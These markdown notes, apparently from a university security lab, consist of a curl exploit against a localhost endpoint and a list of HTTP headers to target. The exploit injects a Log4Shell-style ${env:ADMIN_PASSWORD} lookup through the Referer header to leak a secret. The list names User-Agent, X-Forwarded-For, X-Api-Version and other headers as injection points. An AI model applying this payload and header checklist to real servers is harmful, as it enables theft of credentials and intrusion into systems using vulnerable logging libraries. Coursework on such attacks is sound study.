# Basic Exploit
```Bash
curl http://localhost:8080/rest/wizards/isAlive -H 'GATECH_ID: 904160213' -H 'Content-type: application/json' -H 'Referer: EXPLOIT ${env:ADMIN_PASSWORD}'


```



# Vulnerable Headers
```Bash
User-Agent
Referer 
X-Api-Version
X-Forwarded-For
Authentication
Contact
From
X-Wap-Profile
X-Original-URL
X-Forwarded-Proto
X-Forwarded-Server
Profile
Proxy-Host
Destination
Proxy
Via
True-Client-IP
Client-IP
X-Client-IP
X-Real-IP
X-Originating-IP
CF-Connecting_IP
Forwarded 
```
